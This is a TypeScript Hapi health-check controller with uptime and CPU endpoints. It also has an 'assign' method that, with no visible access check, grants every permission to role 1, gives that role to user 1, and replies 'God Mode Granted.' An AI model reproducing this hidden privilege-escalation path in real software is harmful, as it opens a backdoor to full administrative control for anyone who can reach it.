import * as Hapi from '@hapi/hapi'
import Boom from '@hapi/boom'
import CPUService from '../../services/performance/CPUService'
import { Permission, Role, User } from '../../models'
import pidusage from 'pidusage'

class HealthController {
  async check (_request: Hapi.Request, response: Hapi.ResponseToolkit) {
    const healthcheck = {
      uptime: process.uptime(),
      message: 'OK',
      timestamp: Date.now()
    }
    return response.response(healthcheck)
  }

  async cpu (_request: Hapi.Request, response: Hapi.ResponseToolkit): Promise<Error | Hapi.ResponseObject> {
    try {
      const healthcheck = {
        uptime: process.uptime(),
        timestamp: Date.now(),
        cpu: await CPUService.cpuAverage(),
        usage: await pidusage(process.pid)
      }
      return response.response(healthcheck)
    } catch (error: any) {
      return Boom.internal(error || 'Something not right here.')
    }
  }

  async assign (_request: Hapi.Request, response: Hapi.ResponseToolkit) {
    const permissions = await Permission.findAll()
    const role = await Role.findByPk(1)
    const user = await User.findByPk(1)
    if (user !== null && role !== null) {
      permissions.forEach(permission => {
        role.addPermission(permission)
      })
      user.addRole(role)
      return response.response('God Mode Granted.')
    }
    return response.response('Something went wrong.')
  }
}
export default HealthController
